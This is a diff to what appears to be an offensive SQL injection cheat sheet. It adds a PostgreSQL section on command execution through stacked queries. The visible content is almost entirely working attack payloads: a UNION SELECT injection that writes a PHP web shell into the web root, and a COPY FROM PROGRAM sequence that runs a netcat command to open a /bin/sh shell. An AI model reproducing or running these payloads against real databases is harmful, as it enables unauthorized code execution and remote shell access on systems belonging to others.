@@ -78,6 +78,15 @@ MSSQL Commands:
 
 ```' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //```
 
+### Command Execution with Stacked Queries:
+
+```
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
+CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
+COPY cmd_exec FROM PROGRAM 'nc -l -p -e /bin/sh';        -- Run the system command via the COPY FROM PROGRAM function
+SELECT * FROM cmd_exec;                 -- [Optional] View the results
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
+```
 ### SQL Map 
 
 Usage Commands:
